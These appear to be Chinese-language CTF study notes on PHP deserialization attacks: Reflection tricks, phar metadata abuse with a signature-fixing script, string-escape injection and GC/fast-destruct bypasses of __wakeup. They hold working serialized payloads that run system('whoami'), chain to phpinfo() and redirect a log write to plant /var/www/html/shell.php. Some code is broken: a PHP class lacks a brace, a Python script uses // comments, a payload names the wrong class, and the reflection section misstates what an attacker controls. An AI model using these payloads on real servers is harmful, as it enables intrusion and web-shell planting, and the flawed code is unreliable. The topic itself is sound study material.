#### ReflectionClass/ReflectionObject/ReflectionProperty
**用途：获取和修改类的属性（包括 protected 和 private）**
```
class Auth {
    private $is_admin = false;
    public function __destruct() {
        if ($this->is_admin) {
            system("/readflag");
    }
}

// 题目可能给出反序列化入口，但无法直接修改 private 属性
$obj = unserialize($_GET['data']);

// 使用反射强制修改
$reflection = new ReflectionObject($obj);
$property = $reflection->getProperty('is_admin');
$property->setAccessible(true);   // 绕过private限制
$property->setValue($obj, true);  // 修改为true

unset($obj);
```
**同时也能调用类中的私有方法**
```
class FileManager {
    private $filename;
    private function delete() {
        unlink($this->filename); // 任意文件删除
    }
}

$obj = unserialize($_GET['data']);

// 反射获取并调用private方法
$refObj = new ReflectionObject($obj);
$method = $refObj->getMethod('delete');
$method->setAccessible(true);
$method->invoke($obj); // 触发删除操作
```
**也可以重置诸如__wakeup()的属性实现绕过**
```
class Logger {
    private $log_file = '/safe/path.log';
    public function __wakeup() {
        $this->log_file = '/safe/path.log';
    }
    public function __destruct() {
        file_put_contents($this->log_file, 'hacked');
    }
}

$obj = unserialize($_GET['data']);

// 反射修改被__wakeup()重置的属性
$refObj = new ReflectionObject($obj);
$property = $refObj->getProperty('log_file');
$property->setAccessible(true);
$property->setValue($obj, '/var/www/html/shell.php'); // 覆盖为恶意路径

unset($obj);
```
**ReflectionClass与ReflectionObject相似**
* *ReflectionClass操作类本身，适合静态分析或未实例化的类*
* *ReflectionObject操作实例化对象，适合运行时修改对象状态*
```

## phar协议反序列化

*PHAR（**PHP Archive**）是 PHP 的一种打包格式，类似于 Java 的 JAR 文件。它允许将多个 PHP 文件、资源（如图片、CSS）和元数据（metadata）打包成一个 `.phar` 文件，便于分发和部署。
但 PHAR 不仅仅是一个压缩工具，它还是一个**协议处理器**（`phar://`），可以在运行时动态解析 `.phar` 文件的内容。*

### 1.PHAR文件结构
**phar文件由四个部分组成:**
* **stub**
可以理解为一个标志，格式为`xxx<?php xxx; __HALT_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则phar扩展将无法识别这个文件为phar文件。
* **manifest**
被压缩文件的权限、属性等信息，其中用户自定义的meta-data部分以序列化形式存储，是漏洞利用关键点。
* **contents**
被压缩文件的内容。
* **signature**
末尾的文件签名。

***利用点：phar文件以序列化的形式存储用户自定义的`meta-data`。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。***

**下面的函数会受到影响**
![[phar影响函数.png]]

**使用`phar`进行反序列化攻击的条件：**
* `php.ini`中需要`phar.readonly=off`
* *存在可利用的魔术方法且`phar`文件能上传至服务器*
* *文件操作的参数可控，且且`:`、`/`、`phar`等特殊字符没有被过滤*

### `Phar`文件生成

```
$phar = new phar('exp.phar');
$phar -> startBuffering();
$phar -> setStub("<?php __HALT_COMPILER();?>");
$phar -> setMetadata($pop); 
$phar -> addFromString("test.txt","test");
$phar -> stopBuffering();
```

#### 3.GC机制利用与phar签名修改
由于在phar文件的结尾处存在对于文件的签名,因此我们不能简单的打开文件去修改,而是在修改结束之后需要对签名进行一个处理.

```
<?php 
class getflag{ } 
$a = new getflag(); 
$a = array(0=>$a,1=>null); 
@unlink("phar.phar"); 
$phar = new Phar("phar.phar"); //后缀名必须为phar 
$phar->startBuffering(); 
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub 
$phar->setMetadata($a); //将自定义的meta-data存入manifest 
$phar->addFromString("test.txt", "test"); //随便填一些要压缩的文件 
//签名自动计算 
$phar->stopBuffering(); ?>
```
我们使用16进制编辑器修改其生成的`a:2:{i:0;O:7:"getflag":0:{}i:1;N;}`
`playload:a:2:{i:0;O:7:"getflag":0:{}i:0;N;}`    (原理详见GC回收机制)

*phar文件修改完成了，但是这个phar文件并不是完好的。因为数据与末尾签名对应不上。这里就需要手动修改phar签名。*
```
from hashlib import sha1

with open("phar.phar",'rb') as f: 
   text=f.read() 
   main=text[:-28]                         //正文部分(除去最后28字节) 
   end=text[-8:]                           //最后八位也是不变的 
   new_sign=sha1(main).digest() 
   new_phar=main+new_sign+end 
   open("phar.phar",'wb').write(new_phar) 
   //将新生成的内容以二进制方式覆盖写入原来的phar文件 ​
```
*由此获得一个meta-data部分存在可控代码的phar文件*

## 字符串逃逸

#### 原理：
*PHP的反序列化机制在解析序列化字符串时，会根据指定的长度来读取字符串内容。
若应用程序在序列化数据前对某些字符进行了替换或过滤，导致了序列化字符串长度的变化。
攻击者可以利用这种长度变化来"吞掉"后续的序列化结构，构造新的恶意序列化结构，注入额外的属性或值。*

`* PHP 在反序列化时，语法是以 ; 作为字段的分隔，以 } 作为结尾，在结束符 } 之后的任何内容不会影响反序列化的结果`
`* 字符串值必须以双引号包裹，不能不写或以单引号包裹`

例：```<?php
$a=" O:4:"Name":2:{s:5:"uname";s:5:"xi4a0";s:8:"password";i:100;} "
$a = str_replace("u","",$a);```

此时：```
$a=" O:4:"Name":2:{s:5:"name";s:5:"admin";s:8:"password";i:100;} "```
该序列化字符串是无法进行反序列化的，因为```name"```成为了一个整体，因而却少了一个```"```进行闭合。

攻击者可以利用这点，控制字符串长度差数，构造
`$a=" O:4:"Name":2:{s:40:"u*36 name";s:5:"xi4a0";s:8:"password";i:100;} "`将`";s:5:"xi4a0";s:8:"password";i:100;}`这36个字符“吞掉”，拼接上我们恶意构造的`";s:5:"admin";s:8:"password";i:100;}`,改变属性或值。

**以上是字符串减少造成的逃逸，同时还有字符串增加造成的逃逸**

例：```<?php
$a=" O:4:"Name":2:{s:5:"uname";s:5:"xi4a0";s:8:"password";i:100;} "
$a = str_replace("u","xx",$a);```

同理，我们可以构造:
	`$a=" O:4:"Name":2:{s:72:"u*36";s:5:"admin";s:8:"password";i:100;}";s:5:"xi4a0";s:8:"password";i:100;} "

让增加的`xx`占满72个单位长度，使`";s:5:"admin";s:8:"password";i:100;}`溢出拼接。
至于后面的那些字符就不用管了，函数会忽略它们的。

## GC回收机制

### 前置知识
*PHP 的 GC（Garbage Collection，垃圾回收）机制主要用于自动管理内存，清理不再使用的变量和对象，防止内存泄漏。*

**PHP 的 GC 主要分为两部分：**
##### A.引用计数（PHP 5+）
*PHP 默认使用引用计数来管理变量的生命周期。*
###### 原理
- 每个 PHP 变量（如 \$a、\$obj）在底层都有一个 zval 结构体，其中包含：
    - **refcount**（引用计数）：记录有多少变量指向这个值。
    - **is_ref**（是否为引用变量）：标记是否是 `&` 引用。

当 refcount 降为 **0** 时，PHP 会立即释放该变量的内存。
###### 局限
无法处理循环引用，如**两个对象相互引用**时

##### B.循环引用垃圾回收（PHP 5.3+）
*PHP 5.3 引入了循环引用垃圾回收器（Cycle GC），用于检测并清理循环引用导致的内存泄漏*
###### 原理
1. **根缓冲区（Root Buffer）**
    - 当 refcount 减少但未归零时，PHP 会将该变量加入 **根缓冲区**（疑似垃圾）。

2. **垃圾回收算法**
    - PHP 会定期执行 **标记-清除（Mark & Sweep）** 算法：
        - **标记阶段**：从全局变量（如 \$\_GET、\$_SESSION）出发，标记所有可达对象。
        - **清除阶段**：未被标记的对象（即不可达的循环引用）会被回收。
###### 触发时机
- **自动触发**：当根缓冲区满（默认 **10,000** 个可能垃圾）时，PHP 会执行 GC。
- **手动触发**：调用 gc_collect_cycles() 强制回收

## GC in CTF

### 1.throw new Exception导致的__destruct()不触发
*如果PHP程序在运行中抛出异常（如throw new Exception），导致无法正常结束，\_\_destruct()方法就不会自动触发。*

例题：**NewStarCTF 2023 week4 - More Fast**
```
class Start {
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}
... 其他类 ...
$a = unserialize($_GET['code']);
throw new Exception("Nope");
```

***绕过方法****：提前触发GC来强制调用\_\_destruct()：
 * **unset()**：手动减少引用计数，触发回收。对变量调用unset()函数,refcount-1
例：
```
$obj = new Example();
unset($obj);                      // 触发 __destruct()
throw new Exception("Error");
```

 * **数组置NULL**：通过构造数组并置空元素，使引用计数归零
例：
```
$arr = [new Example(), 0];
$arr[1] = null;                   // 触发 __destruct()
```
### 2.fast-destruct(快速销毁)

#### 原理
*修改序列化字符串的结构，导致其在解析时产生"不完整"的对象，使得对象在反序列化完成后立即被销毁，从而提前触发`__destruct()`方法，绕过题目设置的安全限制，如\_\_wakeup()。*

例：
```
class Exploit {
    public $cmd;
    
    public function __destruct() {
        system($this->cmd);
    }
    
    public function __wakeup() {
        $this->cmd = null; // 尝试防止攻击
    }
}
```

**正常序列化字符串**
```
O:4:"Test":1:{s:3:"cmd";s:6:"whoami";}
```
**Fast Destruct变体** （除去`;}`）
```
O:4:"Test":1:{s:3:"cmd";s:6:"whoami"
```
**Fast Destruct变体** （数组指针冲突）
例：
```
<?php
 
error_reporting(0);
class errorr0{
	public $num;
	public function __construct()
	{
		$this->num = new errorr1();
	}
 
}
class errorr1{
    public $err;
	public function __construct()
	{
		$this->err = new errorr2();
	}
}
 
class errorr2{
    public $err = "phpinfo();";
}
 
$a = new errorr0();
$c = array(0=>$a,1=>NULL);
echo serialize($c);
?>
```
*原序列化字符串*
```
a:2:{i:0;O:7:"errorr0":1:{s:3:"num";O:7:"errorr1":1:{s:3:"err";O:7:"errorr2":1:{s:3:"err";s:10:"phpinfo();";}}}i:1;N;}
```
*当一个变量被设置为NULL，或者没有任何指针指向时，它就会被变成垃圾，被GC机制自动回收掉那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被GC机制回收*
`playload:`
```
a:2:{i:0;O:7:"errorr0":1:{s:3:"num";O:7:"errorr1":1:{s:3:"err";O:7:"errorr2":1:{s:3:"err";s:10:"phpinfo();";}}}i:0;N;}
```
*由于数组指针冲突，部分对象可能提前销毁*

**Fast Destruct变体** （属性值长度不匹配）
例：
```
//正常payload
O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:1:“1”;}

//外部类属性值长度异常payload：
//先外类__destruct()后内类__wakeup()
O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:2:“1”;}  
// 声明长度2，实际值"1"
O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:1:“12”;}
// 声明长度1，实际值"12"
```
*通过破坏A对象的完整性控制销毁顺序，正常情况下先处理内层B对象，再处理A*
- **异常情况**：
    - 解析器发现`A`的属性值长度错误
    - 立即标记`A`为"损坏"并触发其__destruct()
    - 然后才处理内层`B`的__wakeup()
